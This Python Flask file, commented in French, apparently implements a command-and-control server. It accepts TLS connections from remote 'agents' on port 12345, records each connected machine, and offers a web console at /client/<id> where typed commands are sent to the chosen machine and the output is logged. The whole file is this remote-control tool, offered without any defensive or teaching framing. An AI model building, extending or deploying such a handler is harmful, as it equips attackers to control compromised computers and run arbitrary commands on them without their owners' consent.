from flask import Flask, render_template, request, redirect, url_for
import socket, threading, time, ssl, struct, os

app = Flask(__name__)
registre_clients = [] #
mutex = threading.Lock()

def configurer_point_ecoute():
    """Prépare le socket SSL pour les agents entrants"""
    cert_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    cert_ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem') #
    sock_ecoute = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_ecoute.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_ecoute.bind(('0.0.0.0', 12345)) #
    sock_ecoute.listen(5)
    return cert_ctx.wrap_socket(sock_ecoute, server_side=True)

def gestion_entrees_reseau(s_maitre):
    """Thread gérant l'arrivée des nouveaux clients"""
    num_ordre = 1
    while True:
        c_sock, c_addr = s_maitre.accept()
        with mutex:
            registre_clients.append({"id": num_ordre, "sock": c_sock, "addr": c_addr, "history": []}) #
        num_ordre += 1

@app.route('/')
def vue_globale():
    with mutex:
        info_noeuds = [{"id": r["id"], "addr": f"{r['addr'][0]}"} for r in registre_clients]
    return render_template('index.html', clients=info_noeuds) #

@app.route('/client/<int:client_id>', methods=['GET', 'POST'])
def console_pilotage(client_id):
    with mutex:
        cible = next((r for r in registre_clients if r['id'] == client_id), None)
    if not cible: return "Non repertorie", 404

    if request.method == 'POST':
        cmd_web = request.form['command']
        try:
            cible['sock'].send(cmd_web.encode()) #
            data_retour = cible['sock'].recv(4096).decode().strip()
            cible['history'].append((cmd_web, data_retour)) #
        except:
            cible['history'].append((cmd_web, "Lien interrompu"))
    return render_template('control.html', client=cible) #

if __name__ == '__main__':
    ecouteur_ssl = configurer_point_ecoute()
    threading.Thread(target=gestion_entrees_reseau, args=(ecouteur_ssl,), daemon=True).start() #
    app.run(host='127.0.0.1', port=5000)